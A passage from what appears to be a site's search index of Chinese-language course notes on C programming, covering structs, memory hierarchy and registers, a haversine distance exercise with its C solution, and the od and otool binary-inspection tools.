   played;                         // \u6bd4\u8d5b\u573a\u6b21\n    int     won;                            // \u80dc\u573a\u6570\n    int     lost;                           // \u8d25\u573a\u6570\n    int     drawn;                          // \u5e73\u5c40\u573a\u6b21\n    int     bfor;                           // \u8fdb\u7403\u6570\n    int     bagainst;                       // \u5931\u7403\u6570\n    int     points;                         // \u79ef\u5206\n} team[MAX_TEAMS] = {\n    {\"Team A\", 10, 6, 2, 2, 20, 10, 20},    // \u5b9a\u4e49\u7b2c\u4e00\u4e2a\u961f\u4f0d\u7684\u6570\u636e\n    {\"Team B\", 12, 8, 3, 1, 25, 15, 25},    // \u5b9a\u4e49\u7b2c\u4e8c\u4e2a\u961f\u4f0d\u7684\u6570\u636e\n    {\"Team C\", 11, 5, 5, 1, 18, 18, 16}     // \u5b9a\u4e49\u7b2c\u4e09\u4e2a\u961f\u4f0d\u7684\u6570\u636e\n};\n\n// \u6253\u5370\u6240\u6709\u961f\u4f0d\u7684\u4fe1\u606f\nvoid printTeams() {\n    for (int i = 0; i &lt; MAX_TEAMS; i++) {\n        printf(\"Team Name: %s\\n\", team[i].teamname);\n        printf(\"Played: %d, Won: %d, Lost: %d, Drawn: %d\\n\", team[i].played, team[i].won, team[i].lost, team[i].drawn);\n        printf(\"Goals For: %d, Goals Against: %d, Points: %d\\n\", team[i].bfor, team[i].bagainst, team[i].points);\n        printf(\"--------------------------\\n\");\n    }\n}\n\nint main() {\n    printTeams();   // \u8c03\u7528\u51fd\u6570\u6253\u5370\u961f\u4f0d\u4fe1\u606f\n    return 0;\n}\n</code></pre> <p>\u8fd9\u6837\u7ba1\u7406\u5b9a\u4e49\u6781\u5176\u65b9\u4fbf\uff0c\u5982\u679c\u662f\u975e\u533f\u540d\u51fd\u6570\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define MAX_TEAMS               3           // \u5b9a\u4e49\u961f\u4f0d\u6570\u91cf\n#define MAX_TEAMNAME_LEN        30          // \u6700\u5927\u961f\u4f0d\u540d\u79f0\u957f\u5ea6\n\n// \u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53\u7c7b\u578b Team\nstruct Team {\n    char    teamname[MAX_TEAMNAME_LEN+1];   // \u961f\u4f0d\u540d\u79f0\n    int     played;                         // \u6bd4\u8d5b\u573a\u6b21\n    int     won;                            // \u80dc\u573a\u6570\n    int     lost;                           // \u8d25\u573a\u6570\n    int     drawn;                          // \u5e73\u5c40\u573a\u6b21\n    int     bfor;                           // \u8fdb\u7403\u6570\n    int     bagainst;                       // \u5931\u7403\u6570\n    int     points;                         // \u79ef\u5206\n};\n\n// \u5b9a\u4e49 Team \u7c7b\u578b\u7684\u6570\u7ec4\nstruct Team team[MAX_TEAMS] = {\n    {\"Team A\", 10, 6, 2, 2, 20, 10, 20},    // \u7b2c\u4e00\u4e2a\u961f\u4f0d\n    {\"Team B\", 12, 8, 3, 1, 25, 15, 25},    // \u7b2c\u4e8c\u4e2a\u961f\u4f0d\n    {\"Team C\", 11, 5, 5, 1, 18, 18, 16}     // \u7b2c\u4e09\u4e2a\u961f\u4f0d\n};\n\n// \u6253\u5370\u6240\u6709\u961f\u4f0d\u7684\u4fe1\u606f\nvoid printTeams() {\n    for (int i = 0; i &lt; MAX_TEAMS; i++) {\n        printf(\"Team Name: %s\\n\", team[i].teamname);\n        printf(\"Played: %d, Won: %d, Lost: %d, Drawn: %d\\n\", team[i].played, team[i].won, team[i].lost, team[i].drawn);\n        printf(\"Goals For: %d, Goals Against: %d, Points: %d\\n\", team[i].bfor, team[i].bagainst, team[i].points);\n        printf(\"--------------------------\\n\");\n    }\n}\n\nint main() {\n    printTeams();   // \u8c03\u7528\u51fd\u6570\u6253\u5370\u961f\u4f0d\u4fe1\u606f\n    return 0;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u89c1\u9700\u8981\u53e6\u5916\u518d\u58f0\u660e variable \u540e\u8fdb\u884c assignment</p> <p>\u5982\u679c\u4e0d\u4f7f\u7528 struct \u7ed3\u6784\uff0c\u90a3\u5c31\u8981\u624b\u52a8\u91cd\u590d\u53bb\u5b9a\u4e49\u7ba1\u7406\u6240\u6709\u961f\u4f0d\uff1a</p> <pre><code>//  DEFINE THE LIMITS ON PROGRAM'S DATA-STRUCTURES\n#define MAX_TEAMS               24\n#define MAX_TEAMNAME_LEN        30\n....\n\n//  DEFINE A 2-DIMENSIONAL ARRAY HOLDING OUR UNIQUE TEAMNAMES\nchar    teamname[MAX_TEAMS][MAX_TEAMNAME_LEN+1];        // +1 for null-byte\n\n//  STATISTICS FOR EACH TEAM, INDEXED BY EACH TEAM'S 'TEAM NUMBER'\nint     played  [MAX_TEAMS];\nint     won     [MAX_TEAMS];\nint     lost    [MAX_TEAMS];\nint     drawn   [MAX_TEAMS];\nint     bfor    [MAX_TEAMS];\nint     bagainst[MAX_TEAMS];\nint     points  [MAX_TEAMS];\n....\n\n//  PRINT EACH TEAM'S RESULTS, ONE-PER-LINE, IN NO SPECIFIC ORDER\nfor(int t=0 ; t&lt;nteams ; ++t) {\n    printf(\"%s %i %i %i %i %i %i %.2f %i\\n\", // %age to 2 decimal-places\n            teamname[t],\n            played[t], won[t], lost[t], drawn[t],\n            bfor[t], bagainst[t],\n            (100.0 * bfor[t] / bagainst[t]),      // calculate percentage\n            points[t]);\n}\n</code></pre>"},{"location":"cs/c/3.1/#accessing-system-information-using-structures","title":"Accessing system information using structures","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u7684\u4fe1\u606f\u88ab\u85cf\u5728 <code>/usr/include</code> \u548c\u5176 <code>/usr/include/sys</code> \u4e2d</p> <p>\u6211\u4eec\u7528\u975e\u533f\u540d\u51fd\u6570\u4f5c\u6f14\u793a\u4f5c\u6700\u540e\u6536\u5c3e\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/time.h&gt;\n\nstruct timeval {\n    int  tv_sec;       // Seconds\n    int  tv_usec;      // Microseconds\n};\n\nstruct timeval start_time;\nstruct timeval stop_time;\n\ngettimeofday(&amp;start_time, NULL);\nprintf(\"program started at %i.06%i\\n\",\n       (int)start_time.tv_sec, (int)start_time.tv_usec);\n</code></pre> <p>\u6309\u5730\u5740\u4f20\u9012\u7ed3\u6784\uff0c\u4f7f\u7528 &amp; \u8fd0\u7b97\u7b26\uff0c \u4f7f\u5f97 gettimeofday\uff08\uff09\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u65f6\u533a\u4fe1\u606f\u7531\u4e8e\u4e0d\u611f\u5174\u8da3\u6240\u4ee5\u8bbe\u7f6e\u4e3a NULL</p>"},{"location":"cs/c/3.2/","title":"3.2 Computer Hardware","text":""},{"location":"cs/c/3.2/#wed-lecture","title":"Wed Lecture","text":"<p>\u4e3b\u8981\u8bb2\u8ff0\u8ba1\u7b97\u673a\u7ed3\u6784\u4f53\u7cfb\u4e2d\u7684\u77e5\u8bc6\uff0c\u76f4\u5230 Week 4 Mon \u5168\u90e8\u8bb2\u5b8c  </p>"},{"location":"cs/c/3.2/#main-structural-components","title":"Main Structural Components","text":"<ol> <li>\u4e2d\u592e\u5904\u7406\u5668 (CPU - Central Processing Unit)</li> <li>\u6267\u884c\u7b97\u672f\u548c\u903b\u8f91\u8ba1\u7b97 (Arithmetic and Logical Computation)\u3002</li> <li>\u7ba1\u7406\u5927\u90e8\u5206\u5185\u5b58\u548c\u5916\u56f4\u8bbe\u5907\u7684\u8f93\u5165\u8f93\u51fa (Input and Output Services)\u3002</li> <li> <p>\u53ef\u80fd\u6709\u591a\u4e2a\u5904\u7406\u5668 (Multiple Processors) \u5171\u540c\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u6216\u5e94\u7528\u7a0b\u5e8f (Operating System or User/Application Programs)\u3002</p> </li> <li> <p>\u4e3b\u5b58\u50a8\u5668 (RAM - Random Access Memory)</p> </li> <li>\u5b58\u50a8\u6307\u4ee4\u548c\u6570\u636e (Instructions and Data)\u3002</li> <li> <p>\u5904\u7406\u5668\u5728\u7a0b\u5e8f\u7684\u6307\u5bfc\u4e0b\u8bfb\u53d6\u548c\u5199\u5165\u5185\u5b58\u4e2d\u7684\u6570\u636e (Read and Write Memory as Directed by Programs)\u3002</p> </li> <li> <p>\u8f85\u52a9\u5b58\u50a8\u5668\u548c\u5916\u56f4\u8bbe\u5907 (Secondary Storage and Peripheral Devices)</p> </li> <li>\u63d0\u4f9b\u957f\u671f\u3001\u6301\u4e45\u7684\u6570\u636e\u5b58\u50a8 (Long-term Persistent Storage)\uff0c\u5982\u78c1\u76d8 (Disks)\u3001\u78c1\u5e26 (Tapes)\u3002</li> <li> <p>\u5305\u542b\u8f93\u5165/\u8f93\u51fa\u6a21\u5757\u548cI/O\u63a7\u5236\u5668 (I/O Controllers)\u3002</p> </li> <li> <p>\u7cfb\u7edf\u603b\u7ebf (System Bus)</p> </li> <li>\u8fde\u63a5\u5904\u7406\u5668\u3001\u4e3b\u5185\u5b58\u548cI/O\u8bbe\u5907 (Connects Processor, Main Memory, and I/O Devices)\u3002</li> <li>\u5145\u5f53\u6570\u636e\u4f20\u8f93\u7684\u201c\u9ad8\u901f\u516c\u8def\u201d (Data \"Highway\")\u3002</li> <li>\u53ea\u6709\u4e00\u4e2a\u7ec4\u4ef6\u53ef\u4ee5\u63a7\u5236\u603b\u7ebf (Only One Component Can Control the Bus)\uff0c\u901a\u5e38\u901a\u8fc7\u603b\u7ebf\u4ef2\u88c1\u51b3\u5b9a (Bus Arbitration)\u3002</li> </ol>"},{"location":"cs/c/3.2/#processor-registers","title":"Processor Registers","text":"<ul> <li>\u5bc4\u5b58\u5668 \u662f\u5904\u7406\u5668\u5185\u90e8\u7684\u975e\u5e38\u5feb\u901f\u7684\u5b58\u50a8\u4f4d\u7f6e (Fast Memory Locations Inside the Processor)\u3002</li> <li>\u8bbf\u95ee\u65f6\u95f4\u901a\u5e38\u4e3a 0.5-3 \u7eb3\u79d2 (Access Time: 0.5-3 ns)\u3002</li> <li>\u5982\u679c\u6570\u636e\u5728\u5bc4\u5b58\u5668\u4e2d\u800c\u4e0d\u662f\u5728\u4e3b\u5185\u5b58\u4e2d\uff0c\u7a0b\u5e8f\u6267\u884c\u901f\u5ea6\u53ef\u80fd\u63d0\u9ad8 10-500 \u500d (Execution Speed Improvement: 10-500X)\u3002</li> <li> <p>\u5904\u7406\u5668\u5bc4\u5b58\u5668\u7684\u6570\u91cf\u548c\u5bbd\u5ea6\uff08\u5982 64 \u4f4d\u5bc4\u5b58\u5668\uff09\u5f71\u54cd CPU \u7684\u6027\u80fd\u548c\u901f\u5ea6 (Number and Width of Registers Affect CPU Performance)\u3002</p> </li> <li> <p>\u5bc4\u5b58\u5668\u7c7b\u578b (Register Types)\uff1a</p> </li> <li> <p>\u7528\u6237\u53ef\u8bbf\u95ee\u5bc4\u5b58\u5668 (User-Accessible Registers)\uff1a</p> <ul> <li>\u6570\u636e\u5bc4\u5b58\u5668 (Data Registers)\uff1a\u5b58\u50a8\u6570\u636e\u503c\u548c\u8fd0\u7b97\u7ed3\u679c (Hold Values Before and After Instructions)\u3002</li> <li>\u5730\u5740\u5bc4\u5b58\u5668 (Address Registers)\uff1a\u5b58\u50a8\u5185\u5b58\u4f4d\u7f6e\u7684\u5730\u5740 (Hold Addresses of Memory Locations)\uff08\u5982 MAR\u3001MBR\u3001\u7d22\u5f15\u5bc4\u5b58\u5668\u3001\u6808\u6307\u9488\uff09\u3002</li> </ul> </li> <li> <p>\u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668 (Control and Status Registers)\uff1a</p> <ul> <li>\u5b58\u50a8\u5904\u7406\u5668\u72b6\u6001 (Processor Status)\uff08\u5982\u6307\u4ee4\u5bc4\u5b58\u5668 IR\u3001\u7a0b\u5e8f\u8ba1\u6570\u5668 PC\uff09\u3002</li> <li>\u5904\u7406\u5668\u72b6\u6001\u5b57 (PSW - Processor Status Word) \u8bb0\u5f55\u5904\u7406\u5668\u72b6\u6001\u548c\u64cd\u4f5c\u7ed3\u679c (Records Processor Status and Operation Results)\uff08\u5982\u6ea2\u51fa\u3001\u8fdb\u4f4d\u3001\u9664\u96f6\u9519\u8bef\uff09\u3002</li> </ul> </li> </ul>"},{"location":"cs/c/3.2/#memory-hierarchy","title":"Memory Hierarchy","text":"<ul> <li>\u5185\u5b58\u5c42\u6b21\u7ed3\u6784 \u901a\u8fc7\u4e0d\u540c\u5c42\u6b21\u7684\u5185\u5b58\u6765\u5e73\u8861\u6210\u672c\u3001\u5bb9\u91cf\u548c\u8bbf\u95ee\u65f6\u95f4 (Balancing Cost, Capacity, and Access Time)\uff1a</li> <li>\u5bc4\u5b58\u5668\uff1a\u6700\u5feb\uff0c\u5b58\u50a81-4KB\u6570\u636e (Fastest, 1-4KB Data)\u3002</li> <li>L1/L2/L3 \u7f13\u5b58\uff1a\u6bd4\u4e3b\u5185\u5b58\u66f4\u5feb\uff0c\u5bb9\u91cf\u4ece8KB\u523064MB\u4e0d\u7b49 (Caches: 8KB-64MB)\u3002</li> <li>\u4e3b\u5185\u5b58 (RAM)\uff1a\u8f83\u5927\u5bb9\u91cf\uff0c\u8bbf\u95ee\u65f6\u95f410-60\u7eb3\u79d2 (Larger Capacity, 10-60 ns Access Time)\u3002</li> <li>\u786c\u76d8\uff1a\u6700\u6162\uff0c\u5bb9\u91cf\u6700\u5927\uff0c\u8bbf\u95ee\u65f6\u95f4\u4e3a3M-10M\u7eb3\u79d2 (Hard Disk: Slowest, Largest Capacity, 3M-10M ns Access Time)\u3002</li> <li>\u56fa\u6001\u786c\u76d8 (SSD - Solid-State Disk)\uff1a\u4ecb\u4e8e\u4e3b\u5185\u5b58\u548c\u786c\u76d8\u4e4b\u95f4\uff0c\u8bbf\u95ee\u65f6\u95f4\u4e3a0.5M-1M\u7eb3\u79d2 (Intermediate Between RAM and Hard Disk, 0.5M-1M ns Access Time)\u3002</li> </ul>"},{"location":"cs/c/3.2/#data-rates-and-byte-interpretation","title":"Data Rates and Byte Interpretation","text":"<ul> <li>\u57fa\u672c\u6570\u636e\u5355\u5143 (Basic Data Units)\uff1a</li> <li>\u6bd4\u7279 (Bit)\uff1a\u6700\u5c0f\u7684\u6570\u636e\u5355\u5143 (Smallest Data Unit)\u3002</li> <li>\u5b57\u8282 (Byte)\uff1a\u901a\u5e38\u4e3a8\u4f4d\uff0c\u6bd4\u7279\u7684\u57fa\u672c\u7ec4\u5408\u5355\u5143 (Typically 8 Bits)\u3002</li> <li> <p>\u5b57 (Word)\uff1a\u5904\u7406\u5668\u7684\u9ed8\u8ba4\u6570\u636e\u5927\u5c0f (Default Data Size for Processor)\uff1b\u5e38\u89c1\u4e3a32\u4f4d\u621664\u4f4d (Common Word Sizes: 32 or 64 Bits)\u3002</p> </li> <li> <p>\u6570\u636e\u89e3\u91ca (Data Interpretation)\uff1a</p> </li> <li>\u6570\u636e\u7684\u542b\u4e49\u53d6\u51b3\u4e8e\u4e0a\u4e0b\u6587 (Meaning Depends on Context)\uff0c\u4f8b\u5982\uff1a<ul> <li>\u4e00\u4e3232\u4f4d\u7684\u4f4d\u6a21\u5f0f\u53ef\u80fd\u8868\u793aASCII\u5b57\u7b26\u300132\u4f4d\u6574\u6570\u3001\u6d6e\u70b9\u503c\u6216\u5185\u5b58\u5730\u5740 (32-bit Pattern Could Represent ASCII Characters, 32-bit Integer, Floating Point Value, or Memory Address)\u3002</li> <li>\u9519\u8bef\u7684\u89e3\u91ca\u4f1a\u5bfc\u81f4\u5904\u7406\u5668\u9519\u8bef (Errors in Interpretation Can Cause Processor Faults)\u3002</li> </ul> </li> </ul>"},{"location":"cs/c/3.2/#workshop","title":"Workshop","text":"<p>\u8fd9\u4e2a\u4f5c\u4e1a\u91cd\u70b9\u662f\u7528 C11 \u5f00\u53d1\u51fd\u6570\u6765\u8ba1\u7b97\u5730\u7403\u8868\u9762\u4e0a\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\uff0c\u4f7f\u7528\u7684\u662fhaversine \u516c\u5f0f\u3002</p> <ol> <li> <p>\u521b\u5efa\u6570\u636e\u7ed3\u6784\uff1a</p> </li> <li> <p>\u5b9a\u4e49\u4e00\u4e2a C11 \u7ed3\u6784\u4f53\uff0c\u7528\u6765\u8868\u793a\u5730\u7403\u4e0a\u7684\u4e00\u4e2a\u5730\u7406\u70b9\uff08\u5373\u7eac\u5ea6\u548c\u7ecf\u5ea6\uff09\u3002\u8fd9\u5c06\u4e3a\u4f60\u63d0\u4f9b\u4e00\u4e2a\u5b58\u50a8\u8fd9\u4e9b\u6570\u636e\u7684\u65b9\u5f0f\u3002</p> </li> <li> <p>\u5f00\u53d1\u4e09\u4e2a\u51fd\u6570\uff1a</p> </li> <li> <p>degrees_to_radians(double degrees)\u2014\u2014\u4e00\u4e2a\u5c06\u89d2\u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6\u7684\u51fd\u6570\uff08\u56e0\u4e3a\u8fd9\u4e2a\u516c\u5f0f\u662f\u57fa\u4e8e\u5f27\u5ea6\u8ba1\u7b97\u7684\uff09\u3002</p> </li> <li> <p>valid_location(struct point location)\u2014\u2014\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u6765\u68c0\u67e5\u4e00\u4e2a\u7ed9\u5b9a\u7684\u4f4d\u7f6e\u662f\u5426\u5408\u6cd5\uff08\u4f8b\u5982\uff0c\u7eac\u5ea6\u5fc5\u987b\u5728 -90\u00b0 \u5230 90\u00b0 \u4e4b\u95f4\uff09\u3002</p> </li> <li> <p>haversine(struct point location1, struct point location2)\u2014\u2014\u4e3b\u8981\u51fd\u6570\uff0c\u7528\u6765\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</p> </li> <li> <p>\u8bbe\u8ba1\u547d\u4ee4\u884c\u5de5\u5177\uff1a</p> </li> <li> <p>\u5b9e\u73b0\u7a0b\u5e8f\uff0c\u63a5\u53d7\u4ece\u547d\u4ee4\u884c\u4f20\u5165\u7684\u5750\u6807\u5bf9\uff0c\u8fd4\u56de\u8ba1\u7b97\u51fa\u7684\u8ddd\u79bb\uff08\u4ee5\u7c73\u4e3a\u5355\u4f4d\uff09\u3002</p> </li> <li> <p>\u6d4b\u8bd5\u5e76\u6269\u5c55\uff1a</p> </li> <li> <p>\u9996\u5148\uff0c\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</p> </li> <li> <p>\u7136\u540e\uff0c\u5f00\u53d1\u53e6\u4e00\u4e2a\u5de5\u5177\uff0c\u7528\u4e8e\u5904\u7406\u591a\u4e2a\u70b9\uff0c\u8ba1\u7b97\u4ece\u7b2c\u4e00\u4e2a\u70b9\u5230\u6700\u540e\u4e00\u4e2a\u70b9\u7684\u8ddd\u79bb\uff0c\u8def\u5f84\u6cbf\u9014\u7ecf\u8fc7\u6240\u6709\u70b9\u3002</p> </li> </ol>"},{"location":"cs/c/3.2/#vim-template","title":"VIM Template","text":"<p>\u6559\u6388\u76f4\u63a5\u6267\u884c <code>\\vc</code> \u5c31\u5f00\u4e86\u4e00\u4e2a\u80fd\u591f\u5feb\u901f\u7f16\u5199 C \u4ee3\u7801\u7684\u6a21\u7248\uff0c\u8fd9\u79cd\u7f16\u5199\u6a21\u7248\u53ef\u4ee5\u81ea\u5df1\u5728\u67d0\u5904\u521b\u5efa\u4e00\u4e2a blank.c \u505a\u5230</p>"},{"location":"cs/c/3.2/#solutions","title":"Solutions","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdbool.h&gt;\n\n// \u5b9a\u4e49\u5730\u7403\u534a\u5f84\uff0c\u5355\u4f4d\u4e3a\u7c73\n#define EARTH_RADIUS 6371000\n\n// \u5b9a\u4e49\u7ed3\u6784\u4f53\uff0c\u8868\u793a\u5730\u7403\u4e0a\u7684\u4e00\u4e2a\u70b9\uff08\u5373\u4e00\u4e2a\u5730\u7406\u4f4d\u7f6e\uff1a\u7eac\u5ea6\u548c\u7ecf\u5ea6\uff09\nstruct point {\n    double latitude;\n    double longitude;\n};\n\n// \u5c06\u89d2\u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6\u7684\u51fd\u6570\ndouble degrees_to_radians(double degrees) {\n    return degrees * M_PI / 180.0;\n}\n\n// \u68c0\u67e5\u4e00\u4e2a\u70b9\u662f\u5426\u5408\u6cd5\u7684\u51fd\u6570\uff08\u7eac\u5ea6\u5fc5\u987b\u5728-90\u523090\u4e4b\u95f4\uff0c \u7ecf\u5ea6\u5fc5\u987b\u5728-180\u5230180\u4e4b\u95f4\uff09\nbool valid_location(struct point location) {\n    return location.latitude &gt;= -90 &amp;&amp; location.latitude &lt;= 90 &amp;&amp;\n           location.longitude &gt;= -180 &amp;&amp; location.longitude &lt;= 180;\n}\n\n// \u4f7f\u7528 haversine \u516c\u5f0f\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\ndouble haversine(struct point location1, struct point location2) {\n    double lat1 = degrees_to_radians(location1.latitude);\n    double lon1 = degrees_to_radians(location1.longitude);\n    double lat2 = degrees_to_radians(location2.latitude);\n    double lon2 = degrees_to_radians(location2.longitude);\n\n    double dlat = lat2 - lat1;\n    double dlon = lon2 - lon1;\n\n    // haversine \u516c\u5f0f\n    double a = sin(dlat / 2) * sin(dlat / 2) +\n               cos(lat1) * cos(lat2) *\n               sin(dlon / 2) * sin(dlon / 2);\n    double c = 2 * atan2(sqrt(a), sqrt(1 - a));\n\n    return EARTH_RADIUS * c;\n}\n\n// \u547d\u4ee4\u884c\u5de5\u5177\uff1a\u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\nint main(int argc, char *argv[]) {\n    if (argc != 5) {\n        printf(\"Usage: %s lat1 lon1 lat2 lon2\\n\", argv[0]);\n        return 1;\n    }\n\n    struct point location1, location2;\n\n    // \u4ece\u547d\u4ee4\u884c\u53c2\u6570\u8bfb\u53d6\u4f4d\u7f6e\n    location1.latitude = atof(argv[1]);\n    location1.longitude = atof(argv[2]);\n    location2.latitude = atof(argv[3]);\n    location2.longitude = atof(argv[4]);\n\n    // \u9a8c\u8bc1\u8f93\u5165\u7684\u4f4d\u7f6e\u662f\u5426\u5408\u6cd5\n    if (!valid_location(location1) || !valid_location(location2)) {\n        printf(\"Invalid location coordinates.\\n\");\n        return 1;\n    }\n\n    // \u8ba1\u7b97\u4e24\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\n    double distance = haversine(location1, location2);\n    printf(\"Distance: %.0f metres\\n\", distance);\n\n    return 0;\n}\n</code></pre>"},{"location":"cs/c/3.3/","title":"3.3 Functions","text":"<p>lab \u6682\u65f6\u6ca1\u65f6\u95f4\u901f\u5237\u4e86\uff0c\u6401\u7f6e\u5148\u770b Week 4 + Week 5 \u7684\u4e09\u8282\u8bfe</p>"},{"location":"cs/c/4.1/","title":"4.1 Computer Architecture","text":""},{"location":"cs/c/4.1/#mon-lecture","title":"Mon Lecture","text":"<p>Mon \u7684 Lecture \u5ef6\u7eed 3.2 \u7684\u5185\u5bb9\uff0c\u76f8\u5173\u62bd\u8c61\u7b14\u8bb0\u67e5\u770b Chapter 3.2 \u5373\u53ef\uff0c\u6700\u540e\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u53eb <code>od</code> \u7684\u5de5\u5177\uff0c\u8001\u5e08\u4e5f\u62d3\u5c55\u4e86\uff1a</p> <p><code>od</code> \u662f Unix \u548c\u7c7b Unix \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5168\u79f0\u4e3a octal dump\uff0c\u5b83\u7528\u4e8e\u4ee5\u516b\u8fdb\u5236\uff08\u6216\u5176\u4ed6\u8fdb\u5236\uff09\u7684\u5f62\u5f0f\u67e5\u770b\u6587\u4ef6\u6216\u6570\u636e\u7684\u5185\u5bb9\u3002<code>od</code> \u53ef\u4ee5\u663e\u793a\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u6216\u6570\u636e\u5757\uff0c\u5e76\u5c06\u5b83\u4eec\u4ee5\u516b\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236\u3001\u5341\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u6216 ASCII \u683c\u5f0f\u8f93\u51fa\u3002</p>"},{"location":"cs/c/4.1/#_1","title":"\u5e38\u89c1\u9009\u9879\uff1a","text":"<ul> <li><code>-b</code>\uff1a\u4ee5\u5b57\u8282\u7684\u516b\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u3002</li> <li><code>-x</code>\uff1a\u4ee5\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u3002</li> <li><code>-d</code>\uff1a\u4ee5\u5341\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u3002</li> <li><code>-c</code>\uff1a\u5c06\u6bcf\u4e2a\u5b57\u8282\u663e\u793a\u4e3a ASCII \u5b57\u7b26\u3002</li> </ul>"},{"location":"cs/c/4.1/#_2","title":"\u793a\u4f8b\uff1a","text":"<p>\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a <pre><code>od -b /bin/ls\n</code></pre></p> <p>\u8be5\u547d\u4ee4\u4f1a\u4ee5\u516b\u8fdb\u5236\u5b57\u8282\u8868\u793a\u6cd5\uff0c\u67e5\u770b <code>/bin/ls</code> \u6587\u4ef6\uff08\u8fd9\u662f\u7cfb\u7edf\u4e0a\u6267\u884c <code>ls</code> \u547d\u4ee4\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff09\u7684\u5185\u5bb9\u3002</p>"},{"location":"cs/c/4.1/#_3","title":"\u8f93\u51fa\u89e3\u91ca\uff1a","text":"<p>\u8f93\u51fa\u7684\u6bcf\u4e00\u884c\u901a\u5e38\u5305\u542b\u4e24\u4e2a\u90e8\u5206\uff1a 1. \u5de6\u4fa7\u7684\u5730\u5740\u504f\u79fb\u91cf\uff0c\u8868\u793a\u6587\u4ef6\u4e2d\u7684\u4f4d\u7f6e\u3002 2. \u53f3\u4fa7\u7684\u516b\u8fdb\u5236\u503c\uff0c\u8868\u793a\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u5185\u5bb9\u3002</p> <p>\u4f8b\u5982\uff0c\u8f93\u51fa\u7684\u4e00\u90e8\u5206\u53ef\u80fd\u662f\u8fd9\u6837\u7684\uff1a <pre><code>0000000 177 105 114 106 002 001 001 000\n0000010 000 000 000 000 000 000 000 000\n</code></pre></p> <ul> <li><code>0000000</code> \u548c <code>0000010</code> \u8868\u793a\u6587\u4ef6\u7684\u5b57\u8282\u504f\u79fb\u4f4d\u7f6e\u3002</li> <li><code>177 105 114 ...</code> \u662f\u6587\u4ef6\u7684\u5b57\u8282\u503c\uff0c\u4ee5\u516b\u8fdb\u5236\u8868\u793a\u3002</li> </ul>"},{"location":"cs/c/4.1/#_4","title":"\u5e94\u7528\u573a\u666f\uff1a","text":"<ul> <li>\u67e5\u770b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff1a<code>od</code> \u53ef\u4ee5\u7528\u6765\u67e5\u770b\u65e0\u6cd5\u901a\u8fc7\u6587\u672c\u7f16\u8f91\u5668\u8bfb\u53d6\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5185\u5bb9\u3002</li> <li>\u8c03\u8bd5\uff1a\u53ef\u4ee5\u5e2e\u52a9\u5f00\u53d1\u8005\u67e5\u770b\u6587\u4ef6\u7684\u5e95\u5c42\u5b57\u8282\u7ed3\u6784\uff0c\u8c03\u8bd5\u6587\u4ef6\u683c\u5f0f\u6216\u534f\u8bae\u3002</li> <li>\u6587\u4ef6\u68c0\u67e5\uff1a\u5feb\u901f\u68c0\u67e5\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5c24\u5176\u662f\u4e00\u4e9b\u672a\u77e5\u6216\u635f\u574f\u7684\u6587\u4ef6\u3002</li> </ul> <p><code>od</code> \u662f\u4e00\u4e2a\u4f4e\u7ea7\u522b\u7684\u5de5\u5177\uff0c\u4e3b\u8981\u7528\u4e8e\u67e5\u770b\u6587\u4ef6\u7684\u539f\u59cb\u6570\u636e\u3002</p> <p><code>otool</code> \u662f macOS \u548c\u5176\u4ed6\u57fa\u4e8e Darwin \u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4e13\u95e8\u7528\u4e8e\u663e\u793a\u548c\u5206\u6790 Mach-O \u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08macOS \u548c iOS \u4e0a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3001\u5e93\u3001\u76ee\u6807\u6587\u4ef6\u7b49\uff09\u3002</p> <p>Mach-O \u6587\u4ef6\u662f macOS \u548c iOS \u4e0a\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u683c\u5f0f\uff0c\u7c7b\u4f3c\u4e8e Linux \u4e0a\u7684 ELF \u6587\u4ef6\u683c\u5f0f\u3002</p>"},{"location":"cs/c/4.1/#otool","title":"<code>otool</code> \u7684\u529f\u80fd","text":"<p><code>otool</code> \u63d0\u4f9b\u4e86\u5bf9 Mach-O \u6587\u4ef6\u5185\u90e8\u7ed3\u6784\u7684\u8be6\u7ec6\u67e5\u770b\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u4ee5\u4e0b\u5185\u5bb9\uff1a - \u6587\u4ef6\u5934\u4fe1\u606f - \u5b57\u7b26\u8868 - \u7b26\u53f7\u8868 - 